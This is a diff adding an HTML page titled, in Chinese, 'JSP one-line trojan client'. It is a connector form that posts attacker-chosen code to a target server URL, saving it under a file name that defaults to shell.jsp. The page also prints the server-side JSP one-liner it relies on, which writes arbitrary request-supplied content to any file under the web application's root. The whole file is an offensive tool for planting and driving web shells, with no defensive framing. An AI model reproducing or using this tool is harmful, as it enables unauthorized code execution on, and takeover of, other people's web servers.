@@ -1,0 +1,17 @@
+<html>
+<head>
+<title>JSP一句话木马客户端</title>
+</head>
+<div align=center> 
+ <br><br>
+<font color=red>专用JSP木马连接器</font>
+<br><br>
+<form name=get method=post>服务端地址<input name=url size=110 type=text>  
+<br><br>
+<textarea name=t rows=30 cols=120>你提交的代码</textarea>
+<br>保存成的文件名：<input name=f size=30 value=shell.jsp><input type=button onclick="javascript:get.action=document.get.url.value;get.submit()" value=提交> </form>  
+<br>服务端代码:<br>
+<textarea rows=5 cols=120><%if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\")+request.getParameter("f"))).write(request.getParameter("t").getBytes());%></textarea>  
+</div>
+</body>
+
